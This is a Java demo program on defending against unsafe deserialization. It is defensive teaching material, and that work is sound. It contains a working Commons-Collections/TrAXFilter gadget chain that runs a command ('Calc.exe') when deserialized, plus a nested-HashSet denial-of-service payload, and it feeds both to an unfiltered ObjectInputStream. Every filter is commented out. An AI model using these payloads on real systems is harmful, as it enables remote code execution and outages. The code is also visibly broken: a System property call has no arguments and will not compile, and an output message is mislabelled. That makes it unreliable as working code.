package ser05j;

import javax.naming.ConfigurationException;
import javax.xml.transform.Templates;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
//import org.apache.commons.io.serialization.ValidatingObjectInputStream;
// import org.apache.commons.configuration.ConfigurationException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import java.util.HashSet;
import java.util.PriorityQueue;
import java.util.Properties;
import java.util.Set;

/**
 * A simple Java program to demonstrate how to perform input validation on
 * serialized binary buffers. Specifically, we only want to allow instances of
 * the Bicycle class to be deserialized.
 * 
 * @author Pierre Ernst
 * 
 */
public class LookAheadDeserializer {

  private static byte[] serialize(Object o) throws IOException {
    try (ByteArrayOutputStream ba = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(ba);) {
      oos.writeObject(o);
      return ba.toByteArray();
    }
  }

  static byte[] DoSpayload() throws IOException {
    Set<Object> root = new HashSet<>();
    Set<Object> s1 = root;
    Set<Object> s2 = new HashSet<>();
    for (int i = 0; i < 100; i++) {
      Set<Object> t1 = new HashSet<>();
      Set<Object> t2 = new HashSet<>();
      t1.add("foo"); // make it not equal to t2 //$NON-NLS-1$
      s1.add(t1);
      s1.add(t2);
      s2.add(t1);
      s2.add(t2);
      s1 = t1;
      s2 = t2;
    }
    return serialize(root);
  }

  static byte[] RCEpayload() throws Exception {
    Object templates = Gadgets.createTemplatesImpl("Calc.exe"); //$NON-NLS-1$

    ConstantTransformer constant = new ConstantTransformer(String.class);

    // mock method name until armed
    Class[] paramTypes = new Class[] { String.class };
    Object[] args = new Object[] { "foo" }; //$NON-NLS-1$
    InstantiateTransformer instantiate = new InstantiateTransformer(
        paramTypes, args);

    // grab defensively copied arrays
    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes"); //$NON-NLS-1$
    args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs"); //$NON-NLS-1$

    ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

    // create queue with numbers
    PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
    queue.add(1);
    queue.add(1);

    // swap in values to arm
    Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class); //$NON-NLS-1$
    paramTypes[0] = Templates.class;
    args[0] = templates;
        
    return serialize(queue); 
  }
  
  private static Object deserialize(byte[] buffer) throws IOException, ClassNotFoundException {
    Object obj;
    try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(buffer))) {
 //     ois.setObjectInputFilter(new BikeFilter());
      obj = ois.readObject();
    }
    return obj;
  }

  public static void main(String[] args) throws IOException, ClassNotFoundException  {
    Properties props = System.getProperties();
    props.setProperty(

        );  //$NON-NLS-1$//$NON-NLS-2$
    // props.setProperty("jdk.serialFilter", "!*;ser05j.Bicycle;maxdepth=1;maxrefs=1;maxbytes=78;maxarray=10");  //$NON-NLS-1$//$NON-NLS-2$
    
    // Serialize a Bicycle instance
    byte[] serializedBicycle = serialize(new Bicycle(0, "Unicycle", 1)); //$NON-NLS-1$

    // Serialize a File instance
    byte[] serializedFile = serialize(new File("file.txt")); //$NON-NLS-1$

    // Deserialize the Bicycle instance (legitimate use case)
    Bicycle bicycle0 = (Bicycle) deserialize(serializedBicycle);
    System.out.println(bicycle0.getName() + " has been deserialized."); //$NON-NLS-1$

    try {
      // Deserialize the File instance (misuse case)
      @SuppressWarnings("unused")
      Object exploit = deserialize(serializedFile);
      System.out.println("exploit has been deserialized."); //$NON-NLS-1$
    } catch (ClassNotFoundException | IOException e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
    }

    // Deserialize RCE
     try {
      deserialize(RCEpayload());
      System.out.println("DoS has been deserialized."); //$NON-NLS-1$
    } catch (Exception e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
    }

    // Deserialize DoS
    try {
      deserialize(DoSpayload());
      System.out.println("DoS has been deserialized."); //$NON-NLS-1$
    } catch (ClassNotFoundException | IOException e) {
      // TODO Auto-generated catch block
      e.printStackTrace();
    }

  } // end main
} // end LookAheadDeserializer

/*
private static Object deserialize(byte[] buffer) throws IOException, ClassNotFoundException, ConfigurationException {
  Object obj; 
  try (ByteArrayInputStream bais = new ByteArrayInputStream(buffer); 
  // Use ValidatingObjectInputStream instead of InputStream
  ValidatingObjectInputStream ois = new ValidatingObjectInputStream(bais);) {
    ois.accept(Bicycle.class); 
    obj = ois.readObject(); 
  } 
  return obj; 
}
 */